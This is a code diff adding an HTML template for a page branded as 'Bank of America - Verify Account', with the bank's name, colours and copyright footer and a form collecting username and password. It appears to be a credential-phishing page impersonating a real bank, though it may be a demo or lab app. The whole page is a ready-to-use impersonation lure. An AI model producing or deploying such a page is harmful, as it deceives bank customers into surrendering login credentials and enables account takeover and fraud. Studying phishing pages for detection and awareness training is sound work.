@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bank of America - Verify Account</title>
+    <style>
+        /* General Reset */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: Arial, sans-serif;
+            line-height: 1.6;
+            background-color: #f4f7fa;
+            color: #333;
+        }
+
+        /* Header Styling */
+        header {
+            background-color: #004F98; /* Bank of America Blue */
+            color: white;
+            padding: 15px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+        }
+
+        header .logo h1 {
+            font-size: 24px;
+            font-weight: bold;
+        }
+
+        header .navbar {
+            display: flex;
+            gap: 20px;
+        }
+
+        header .navbar a {
+            color: white;
+            text-decoration: none;
+            font-size: 16px;
+            transition: color 0.3s ease;
+        }
+
+        header .navbar a:hover {
+            color: #4CAF50; /* Green on hover */
+        }
+
+        /* Hero Section Styling */
+        .hero {
+            background-image: url('https://images.unsplash.com/photo-1601597111158-2fceff292cdc?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=1470&q=80');
+            background-size: cover;
+            background-position: center;
+            height: 300px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            color: white;
+        }
+
+        .hero-content h2 {
+            font-size: 36px;
+            margin-bottom: 10px;
+        }
+
+        .hero-content p {
+            font-size: 18px;
+        }
+
+        /* Verify Account Section Styling */
+        .verify-account {
+            padding: 40px 20px;
+            text-align: center;
+        }
+
+        .verify-account h2 {
+            font-size: 32px;
+            margin-bottom: 20px;
+            color: #004F98;
+        }
+
+        .verify-form {
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            max-width: 400px;
+            margin: 0 auto;
+            text-align: left;
+        }
+
+        .verify-form label {
+            display: block;
+            font-size: 16px;
+            margin-bottom: 5px;
+            color: #004F98;
+        }
+
+        .verify-form input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 16px;
+        }
+
+        .verify-form button {
+            background-color: #004F98;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        .verify-form button:hover {
+            background-color: #003366;
+        }
+
+        /* Account Details Section Styling */
+        .account-details {
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            max-width: 600px;
+            margin: 20px auto;
+            text-align: left;
+        }
+
+        .account-details h3 {
+            font-size: 24px;
+            margin-bottom: 15px;
+            color: #004F98;
+        }
+
+        .account-details p {
+            font-size: 16px;
+            margin-bottom: 10px;
+            color: #555;
+        }
+
+        /* Footer Styling */
+        footer {
+            background-color: #004F98;
+            color: white;
+            text-align: center;
+            padding: 15px 0;
+            margin-top: 40px;
+        }
+
+        footer p {
+            font-size: 14px;
+        }
+        .success-message {
+            display: inline-block;
+    background-color: rgba(0, 255, 17, 0.1);
+    color: rgb(37, 143, 19); 
+    padding: 10px 20px;
+    border-radius: 8px;
+    text-align: center;
+    font-weight: normal;
+    opacity: 0;
+    animation: fadeIn 0.5s ease-in-out forwards, shake 0.5s ease-in-out 0.5s;
+}
+.error-message {
+    display: inline-block;
+    background-color: rgba(255, 0, 0, 0.1); 
+    color: darkred; 
+    padding: 10px 20px;
+    border-radius: 8px; 
+    text-align: center;
+    font-weight: normal;
+    opacity: 0;
+    animation: fadeIn 0.5s ease-in-out forwards, shake 0.5s ease-in-out 0.5s;
+}
+@keyframes fadeIn {
+    from {
+        opacity: 0;
+        transform: translateY(-10px);
+    }
+    to {
+        opacity: 1;
+        transform: translateY(0);
+    }
+}
+@keyframes shake {
+    0%, 100% { transform: translateX(0); }
+    25% { transform: translateX(-5px); }
+    50% { transform: translateX(5px); }
+    75% { transform: translateX(-3px); }
+}
+.users{
+    margin-top: 10px;
+}
+    </style>
+</head>
+<body>
+    <!-- Header Section -->
+    <header>
+        <div class="logo">
+            <h1>🏦 Bank of America</h1>
+        </div>
+        <nav class="navbar">
+            <a href="accdashboard">🏢Home</a>
+            <a href="customercare">📞 Customer Care</a>
+            <a href="security">🔒 Security</a>
+            <a href="aboutus">ℹ️ About Us</a>
+        </nav>
+    </header>
+
+    <!-- Hero Section -->
+    <section class="hero">
+        <div class="hero-content">
+            <h2>Welcome to Bank of America</h2>
+            <p>Verify your account details securely and access your financial information.</p>
+        </div>
+    </section>
+
+    <!-- Verify Account Section -->
+    <section class="verify-account">
+        <h2>Verify Your Account</h2>
+        <div class="verify-form">
+            <form action="" method="POST">
+                 {{#if errorMessage}}
+      <div class="bg-red-50 text-red-700 p-3 rounded-lg mb-4 error-message flex items-center">
+        <span class="mr-2">⚠️</span> {{errorMessage}}
+      </div>
+      {{/if}}
+
+      {{#if successMessage}}
+      <div class="bg-green-50 text-green-700 p-3 rounded-lg mb-4 success-message flex items-center">
+        <span class="mr-2">✅</span> {{successMessage}}
+      </div>
+      {{/if}}
+                <label for="accountNumber">👤 Username</label>
+                <input type="text" id="name" name="name" placeholder="Enter Your Username" required>
+
+                <label for="pin">🔐 Password</label>
+                <input type="password" id="password" name="password" placeholder="Enter Your Password" required>
+
+                <button type="submit">Verify Account</button>
+            </form>
+        </div>
+
+    <!-- Footer Section -->
+    <footer>
+        <p>&copy; 2023 Bank of America. All rights reserved.</p>
+    </footer>
+</body>
+</html>
